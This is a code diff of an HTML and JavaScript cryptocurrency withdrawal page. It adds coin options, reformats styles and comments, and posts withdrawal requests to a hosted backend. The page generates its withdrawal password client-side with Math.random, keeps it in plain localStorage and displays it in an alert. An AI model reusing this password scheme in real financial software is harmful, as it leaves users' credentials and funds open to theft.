@@ -6,10 +6,14 @@
 <title>Withdrawal</title>
 
 <style>
-    * { box-sizing: border-box; /* 防止所有元素溢出 */ }
+    * { box-sizing: border-box; }
     body { background-color: transparent; font-family: Arial, sans-serif; margin: 0; padding: 0; width: 100%; overflow-x: hidden; }
     .withdraw-box { width: 100%; max-width: 450px; margin: 30px auto; padding: 25px; border-radius: 12px; background: transparent !important; color: white; }
-    select, input, button { width: 100%; max-width: 100%; padding: 12px; margin-top: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.6); background: transparent !important; color: white; font-size: 15px; display: block; }
+    select, input, button {
+        width: 100%; max-width: 100%; padding: 12px; margin-top: 8px;
+        border-radius: 6px; border: 1px solid rgba(255,255,255,0.6);
+        background: transparent !important; color: white; font-size: 15px; display: block;
+    }
     select option { color: black; }
     button { cursor: pointer; font-weight: bold; border: none; background: #0099cc; }
     button:disabled { background: #444; }
@@ -29,7 +33,23 @@
         <option value="BTC">BTC</option>
         <option value="ETH">ETH</option>
         <option value="USDT">USDT</option>
-        <!-- 其他币种略去 -->
+        <option value="BNB">BNB</option>
+        <option value="XRP">XRP</option>
+        <option value="ADA">ADA</option>
+        <option value="SOL">SOL</option>
+        <option value="DOGE">DOGE</option>
+        <option value="TRX">TRX</option>
+        <option value="DOT">DOT</option>
+        <option value="MATIC">MATIC</option>
+        <option value="LTC">LTC</option>
+        <option value="AVAX">AVAX</option>
+        <option value="UNI">UNI</option>
+        <option value="ETC">ETC</option>
+        <option value="ATOM">ATOM</option>
+        <option value="XMR">XMR</option>
+        <option value="FIL">FIL</option>
+        <option value="APT">APT</option>
+        <option value="ARB">ARB</option>
     </select>
 
     <label>Enter Coin Amount</label>
@@ -40,11 +60,13 @@
     <label>Password</label>
     <input type="password" id="password" placeholder="Enter password" />
 
+    <!-- 左右按钮：创建密码 + 确认密码 -->
     <div class="row">
         <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
         <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
     </div>
 
+    <!-- 忘记密码 -->
     <button onclick="forgotPassword()">Forgot Password?</button>
 
     <label>Wallet Address</label>
@@ -99,7 +121,8 @@ function createPassword() {
     storedPassword = Math.random().toString(36).substr(2, 6).toUpperCase();
     localStorage.setItem("withdraw_password", storedPassword);
 
-    alert("Your Password: " + storedPassword);
+    alert("Your Password: " + storedPassword + "\n\n🤖 Please change your withdrawal password immediately.");
+
     document.getElementById("createPwdBtn").style.display = "none";
 }
 
@@ -160,7 +183,7 @@ async function submitWithdrawal() {
     };
 
     try {
-        const res = await fetch("https://crypto-management-production-5e04.up.railway.app/api/order/withdraw", {   // 修改为你的后端地址
+        const res = await fetch("https://crypto-management-production-5e04.up.railway.app/api/order/withdraw", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
